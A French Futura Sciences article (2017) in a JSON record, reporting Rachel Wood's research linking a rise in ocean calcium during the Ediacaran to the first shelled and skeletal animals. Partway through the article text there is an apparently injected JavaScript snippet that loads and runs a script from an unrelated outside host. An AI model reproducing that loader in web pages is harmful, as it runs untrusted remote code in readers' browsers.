{"title": "Et si la chimie des oceans avait engendre squelettes et coquilles ?", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-04-15", "content": "En fouillant dans les archives sedimentaires de l'Edicarien, un groupe de chercheurs en geosciences a decouvert des indices qui pourraient permettre de mieux comprendre l'apparition des premiers animaux avec des parties dures en calcaire. Une brusque augmentation de la quantite de calcium dans les oceans aurait favorise ce bond evolutif. Ce qu'il faut retenir Il y a environ 550 millions d'annees, la vie decouvre la biomineralisation des tissus en produisant des animaux avec coquilles et squelettes. Les chercheurs suspectent maintenant que ce sont des changements dans la composition chimique des oceans, devenus par endroit plus riches en calcium, qui ont permis aux animaux doues des bons genes d'exploiter cette possibilite a leur avantage. Comment et pourquoi sont apparues les premieres formes de vie avec des  coquilles  et des squelettes calcaires ? Nous ne le savons pas vraiment si ce n'est que cela a du survenir conformement aux lois de l'evolution et donc par une combinaison du hasard et de la necessite, c'est-a-dire des mutations aleatoires des  genomes  en  conjonction  avec la pression des conditions des milieux ou se trouvaient les formes vivantes douees de ces mutations. La  biologie moleculaire  et l'etude des  genes  des animaux construisant des parties dures composees de  carbonates de calcium  aident bien sur les geologues et les geochimistes a en savoir plus. En outre, les chercheurs peuvent aussi consulter les archives laissees par la  Terre , telles les  strates  datant de l'Ediacara, il y a environ 550 millions d'annees. En effet, c'est autour de cette date que seraient apparues les premieres formes de vie avec des parties dures en  calcaire . C'est ce que fait notamment Rachel Wood, chercheuse en biogeologie des carbonates et professeure a l'universite d'Edimbourg. La Youdoma est une riviere qui coule en Siberie orientale (Russie). Ses berges permettent d'avoir acces a des calcaires datant de l'Ediacarien, juste avant l'explosion cambrienne. (c) Rachel Wood                               Des oceans enrichis en calcium a l'origine de la biomineralisation ? On peut trouver des strates de l'Ediacara en Siberie, sur les berges de la riviere Youdoma. Rachel Wood les etudie depuis quelque temps deja avec des collegues russes car elles contiennent la memoire de certains changements dans la composition chimique des oceans de cette periode ainsi que des  fossiles  des animaux qui y vivaient. La geologue a ainsi montre qu'il y a environ 550 millions d'annees, les strates qui contenaient en majorite un carbonate riche en  magnesium , la dolomite, deviennent soudain des calcaires, donc des carbonates nettement moins riches en magnesium, contenant de l' aragonite  et de la  calcite . Ces deux mineraux se forment plus rapidement et avec moins d' energie  que la dolomite. Clairement, ce sont les conditions physico-chimiques des  oceans  qui ont change a ce moment-la, favorisant la precipitation de ses mineraux. Le phenomene semble  concomitant  d'une augmentation du taux d' oxygene  dans les oceans ainsi que d'une augmentation de l'erosion des continents qui auraient brutalement fait croitre la quantite de  calcium  present dans l'eau.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Il est permis de penser que ces conditions favorisant la production de calcaire par rapport a la dolomite ont aussi avantage l'utilisation du calcium pour faire des parties dures en calcaire chez les animaux dotes du genome capable de permettre la construction de coquilles et des squelettes. Une reconstitution d'artiste de  Suvorovella aldanica  (10 cm), un animal avec une coquille qui vivait il y a 550 millions d'annees. (c) Alina Konovalenko                               Dans un article recent publie avec des collegues de l'universite Lomonosov de Moscou dans  Proceedings of the Royal Society B : Biological Sciences , Rachel Wood vient d'apporter des elements supplementaires appuyant cette these. Il etait constate auparavant que les organismes avec des parties dures succedaient aux organismes avec des parties molles pendant l'Ediacara et peu avant la fameuse  explosion cambrienne . Cela suggerait une  extinction  notable de ces organismes qui auraient notamment laisse le champ libre a ceux avec coquilles, lesquels auraient donc occupe des niches ecologiques vacantes. Mais l'equipe de Wood a finalement montre que ces organismes ont coexiste pendant un temps et aussi que plusieurs animaux a partie molle ressemblant a d'autres avec des parties dures peuvent etre trouves. Par contre, ceux avec parties dures se trouvaient exclusivement dans des  sediments  qui se sont formes dans les eaux les plus riches en calcium, lesquels sont donc devenus du calcaire et non de la dolomite. Il semble que ce soit bien les changements dans la composition chimique des oceans qui a avantage les animaux qui ont commence a s'engager sur la voie conduisant par la suite aux  vertebres . Selon Rachel Wood :  << La facon dont les animaux ont produit des coquilles et des squelettes est un des evenements majeurs de l'evolution de la vie. Nous commencons tout juste a comprendre les processus qui sous-tendent cette revolution >> . ", "theme": "planete"}